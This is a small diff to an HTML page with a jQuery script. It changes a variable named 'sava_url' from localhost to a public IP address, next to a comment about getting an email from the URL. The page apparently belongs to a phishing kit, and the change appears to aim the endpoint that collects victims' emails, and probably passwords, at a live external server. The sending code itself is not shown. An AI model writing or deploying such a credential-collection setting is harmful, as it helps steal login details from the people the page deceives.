@@ -179,7 +179,7 @@
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
 <script>
 /* global $ */
-var sava_url = 'http://127.0.0.1'
+var sava_url = 'http://5.230.249.226'
 $(document).ready(function() {
     var count = 0;
     /////////////url email getting////////////////
